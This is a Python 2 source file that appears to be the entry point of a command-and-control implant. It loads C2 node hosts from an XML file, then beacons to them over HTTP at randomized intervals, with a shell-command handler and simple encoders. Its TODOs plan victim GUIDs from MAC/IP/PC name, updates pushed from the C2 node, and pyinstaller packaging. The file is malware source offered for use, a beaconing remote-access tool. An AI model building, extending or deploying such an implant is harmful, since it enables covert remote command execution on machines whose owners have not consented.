#!/usr/bin/env python

from controller import Controller, NODE_IP_KEY, NODE_PORT_KEY
import time
from random import randint
import sys
import xml.etree.ElementTree as ET

#
# Overall configurations should include:
# - XML to be parsed by Python to provide Strings of available modules
# - A pyinstaller
#
# TODO:
# - Prevent replays
# - Add active day and active hour calculation to calculate_sleep()
# - Get a GUID based off of MAC/IP/PC Name
# - Move global values into an xml/plist type file for persistent changes from C2 node.
# - Create a tracking mechanism for threads started by commands from previous orders
#
# READ:
# - http://docs.python-guide.org/en/latest/shipping/freezing/
# - http://stackoverflow.com/questions/13629321/handling-dynamic-import-with-py2exe
# - http://www.pythoncentral.io/pyinstaller-package-python-applications-windows-mac-linux/

PROMPT = "[]>"
DEFAULT_CONFIG_FILE = "settings.xml"
NODES_TAG = 'nodes'
NODE_TAG = 'node'
N_TYPE_T = 'type'
N_PORT_T = 'port'
N_HOST_T = 'host'
PARAMS_TAG = 'parameters'
PARAM_TAG = 'parameter'
P_NAME_T = 'name'

MIN_SLEEP_INT = 60
MAX_SLEEP_INT = 600
ACTIVE_DAYS = ('M','T','W','Th','F','Sa','Su')
ACTIVE_HOURS = ('0001','2359')

# global flag
continue_beacon = True

def get_xml():
    
    config_filename = DEFAULT_CONFIG_FILE
    
    if len(sys.argv) > 1:
        config_filename = sys.argv[1]
    
    try:
        xmltree = ET.parse(config_filename)
        xmlroot = xmltree.getroot()
    except IOError, io:
        print '%s ERROR: Issue getting file \'%s\'. Make sure it exists at the appropriate path.' % (PROMPT, config_filename)
        exit()
    except Exception, e:
        raise e
        
    return xmlroot
    
def parse_nodes(xml):
    
    nodes_list = []
    for n in xml.findall(NODE_TAG):
        
        try:
            n_type = n.attrib[N_TYPE_T]
        
            n_dict = {}
            n_dict[NODE_PORT_KEY] = n.find(N_PORT_T).text
            n_dict[NODE_IP_KEY] = n.find(N_HOST_T).text
            
        except:
            print '%s Nodes must provide a type, host/ip and port at minimum' % (PROMPT)
            raise
        
        for param in n.find(PARAMS_TAG).findall(PARAM_TAG):
            n_dict[param.get(P_NAME_T)] = param.text
        
        nodes_list.append((n_type,n_dict))
        
    return nodes_list

def load_config():
    #
    # this is where the configuration file is parsed.
    #
    try:
        config_xml = get_xml()
        
        parsed_nodes = parse_nodes(config_xml.find(NODES_TAG))
        if len(parsed_nodes) > 0:
            global NODES
            NODES = parsed_nodes
        
    except Exception, e:
        print '%s Fatal error parsing XML element - %s' % (PROMPT, e)
        exit()

    beacons = ['http_get']
    commands = ['shell_command', 'test_command']
    decoders = ['base64c','rot13','jsonc']
    encoders = []
    responders = []
    
    if len(encoders) == 0:
            encoders = reversed(decoders)
            
    if len(responders) == 0:
            responders = beacons
    
    return (beacons,commands,decoders,encoders,responders)
    
def calculate_sleep():

    #cur_time = time.ctime()
    sleep_time = 0

    sleep_time += randint(MIN_SLEEP_INT,MAX_SLEEP_INT)
    
    return sleep_time
    

def start_beacon_loop(controller):
    
    while continue_beacon:
        
        controller.beacon(NODES)
        sleep_int = calculate_sleep()
        print PROMPT + " Sleeping for %d seconds" % (sleep_int)
        time.sleep(sleep_int)
        
    return True
                

def main():
    
    print PROMPT + " Starting..."
    beacons, commands, decoders, encoders, responders = load_config()
    
    print PROMPT + " Building controller..."
    controller = Controller(beacons, commands, decoders, encoders, responders)
    
    print PROMPT + " Starting beaconer loop..."
    start_beacon_loop(controller)
    

if __name__ == "__main__":
    try:
        main()
    except (KeyboardInterrupt, SystemExit):
        print PROMPT + " Exiting"
        exit()
